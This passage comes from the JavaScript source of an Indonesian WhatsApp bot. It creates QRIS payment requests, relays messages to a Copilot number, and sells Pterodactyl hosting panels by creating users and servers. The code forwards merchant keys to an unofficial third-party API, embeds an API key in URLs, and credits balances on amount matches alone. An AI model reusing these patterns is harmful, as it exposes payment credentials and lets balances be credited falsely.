 const newteks = m.quoted ? m.quoted.text : text; // Dapatkan teks dari pesan yang dibalas atau input

 // Update global capikey dengan nilai baru
 global.capikey3 = newteks;

 // Kirim balasan bahwa capikey telah berhasil diganti
 await cupen.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" }, { quoted: m });
 } else {
 // Jika format salah, kirimkan pesan contoh format yang benar
 await cupen.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` }, { quoted: m });
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'qris':
{
 if (!text) return m.reply('Masukkan nominal, contoh: #deposit 1000');
 const amount = parseInt(text);
 if (isNaN(amount)) return m.reply('Nominal tidak valid. Pastikan hanya angka, contoh: #deposit 1000');

 const fee = Math.floor(Math.random() * 101); // Biaya acak antara 0 - 100
 const totalAmount = amount + fee;

 try {
 // Membuat QRIS
 const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${totalAmount}&codeqr=${qrisorkut}`)).json();

 const expirationTime = new Date(pay.result.expirationTime);
 const timeLeft = Math.max(0, Math.floor((expirationTime - new Date()) / 60000));
 const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
 const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
 const hours = expireTimeJakarta.getHours().toString().padStart(2, '0');
 const minutes = expireTimeJakarta.getMinutes().toString().padStart(2, '0');
 const formattedTime = `${hours}:${minutes}`;

 const tek = `*BERIKUT DETAIL PEMBAYARAN*\n\nID TRANSAKSI: ${pay.result.transactionId}\nJUMLAH TRANSAKSI: Rp. ${totalAmount}\n\nSilahkan scan QRIS di atas sebelum ${formattedTime} WIB untuk pembayaran.`;
 await cupen.sendMessage(m.chat, { image: { url: `${pay.result.qrImageUrl}` }, caption: `${tek}` }, { quoted: m });

 const apiUrl = `https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`;
 let isTransactionComplete = false;
 const maxWaitTime = 5 * 60 * 1000; // Waktu tunggu maksimal 5 menit
 const startTime = new Date().getTime();

 while (!isTransactionComplete && new Date().getTime() - startTime < maxWaitTime) {
 try {
 const response = await fetch(apiUrl);
 const result = await response.json();

 if (result && result.amount && parseInt(result.amount) === totalAmount) {
 isTransactionComplete = true;

 // Simpan data pengguna ke file JSON
 const fs = require('fs');
 const usersFilePath = 'src/users.json';
 let usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));

 const userNumber = `${m.sender}`;
 let user = usersData.find(user => user.nomer === userNumber);

 if (user) {
 user.balance = (parseInt(user.balance) || 0) + amount;
 } else {
 user = { nomer: userNumber, balance: amount };
 usersData.push(user);
 await cupen.sendMessage(m.chat, { text: 'Akun Anda telah terdaftar otomatis karena tidak ditemukan di sistem. Selamat menggunakan layanan kami!' }, { quoted: m });
 }

 fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
 const notification = `*PEMBAYARAN ANDA SELESAI!*\n\n*ID TRANSAKSI:* ${pay.result.transactionId}\n*JUMLAH DITAMBAHKAN:* Rp. ${amount}\n*PEMBAYARAN BERHASIL DITERIMA.*`;
 await cupen.sendMessage(m.chat, { text: notification }, { quoted: m });
 }
 } catch (error) {
 console.error('Error memeriksa status transaksi:', error);
 }

 if (!isTransactionComplete) {
 await new Promise(resolve => setTimeout(resolve, 10000)); // Tunggu 10 detik sebelum cek ulang
 }
 }

 if (!isTransactionComplete) {
 const expiredText = `*WAKTU PEMBAYARAN TELAH HABIS!*\n\nTransaksi Anda telah melebihi batas waktu untuk melakukan pembayaran. Silakan coba lagi dengan membuat transaksi baru.`;
 await cupen.sendMessage(m.chat, { text: expiredText }, { quoted: m });
 }

 } catch (error) {
 console.error('Error membuat QRIS atau memeriksa status:', error);
 m.reply('Gagal membuat atau memeriksa pembayaran.');
 }
}
break;


//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'chatbot': {
const microsoftCopilotNumber = '18772241042@s.whatsapp.net';
if (!text) {
return m.reply("Silakan masukkan pesan yang ingin dikirim.");
}
await cupen.sendMessage(microsoftCopilotNumber, {
text: text
});
if (global.responseListener) {
cupen.ev.off('messages.upsert', global.responseListener);
}
global.responseListener = async (msg) => {
if (
msg.messages[0].key.remoteJid === microsoftCopilotNumber && 
msg.messages[0].message?.conversation
) {
const response = msg.messages[0].message.conversation;
await cupen.sendMessage(m.chat, {
text: `${response}`
});
}
};
cupen.ev.on('messages.upsert', global.responseListener);
}
break
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'cpanel':
{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 const videoUrl = 'https://files.catbox.moe/et30hu.jpg';

 let teks = `
┌───「 *List Panel V1* 」───
│ 1gb *(Nama-User)*
│ 2gb *(Nama-User)*
│ 3gb *(Nama-User)*
│ 4gb *(Nama-User)*
│ 5gb *(Nama-User)*
│ unli *(Nama-User)*
└───────────────────
┌───「 *List Panel V2* 」───
│ 1gb-2 *(Nama-User)*
│ 2gb-2 *(Nama-User)*
│ 3gb-2 *(Nama-User)*
│ 4gb-2 *(Nama-User)*
│ 5gb-2 *(Nama-User)*
│ unli-2 *(Nama-User)*
└───────────────────
┌───「 *List Panel V3* 」───
│ 1gb-3 *(Nama-User)*
│ 2gb-3 *(Nama-User)*
│ 3gb-3 *(Nama-User)*
│ 4gb-3 *(Nama-User)*
│ 5gb-3 *(Nama-User)*
│ unli-3 *(Nama-User)*
└───────────────────
> ❀SalwaCantik❀
`;

 await cupen.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀',
 body: 'Simple Bot WhatsApp.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '1gb':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "1024"; // Memori unlimited
 let cpu = "500"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '2gb':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "2024"; // Memori unlimited
 let cpu = "1000"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '3gb':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "3024"; // Memori unlimited
 let cpu = "2000"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '4gb':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "4024"; // Memori unlimited
 let cpu = "3000"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '5gb':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "5024"; // Memori unlimited
 let cpu = "4000"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '1gb-2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "1024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: "https://files.catbox.moe/et30hu.jpg" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '2gb-2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "2024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
